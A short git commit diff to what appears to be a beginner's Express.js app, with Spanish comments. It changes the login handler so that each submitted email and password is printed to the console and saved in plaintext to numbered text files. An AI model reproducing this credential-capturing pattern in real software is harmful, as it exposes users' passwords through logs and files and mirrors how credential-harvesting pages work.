15f206fc0b0fbefebde36bbee43929fd20041d2d
Christian Rodriguez <christianrodriguezt@gmail.com>
2019-04-12 09:16:40 -0500

    Crea un txt con usuario y contraseña cada vez que ingresa

--- inde.js
+++ inde.js
@@ -2,7 +2,11 @@ var express = require ('express');
 var exphbs = require('express-handlebars');
 var app = express();
 
+var fs = require('fs');
+var cont = 0;
+
 app.use(express.static('public')); //DEcirle a express que la carpeta contiene información pública
+app.use(express.urlencoded( {extended: true}));
 
 app.engine('handlebars', exphbs());
 app.set('view engine', 'handlebars');
@@ -16,10 +20,17 @@ app.get ('/', function(request, response){
     response.render('home',contexto);
 });
 
+function archivoCreado(){
+    console.log('Archivo Creado mis prros')
+}
+
 //Todo hasta aqui tiene que estar en todos los servidores
 
 app.post('/login', function(request, response){ //PAra crear información
-    console.log('El huevo');
+    console.log(request.body.correo);
+    console.log(request.body.contrasena);
+    fs.writeFile('Usuario'+ cont+'.txt', request.body.correo + '\n' + request.body.contrasena, archivoCreado);
+    cont ++;
     response.send('el huevo 2');
 }); 
 
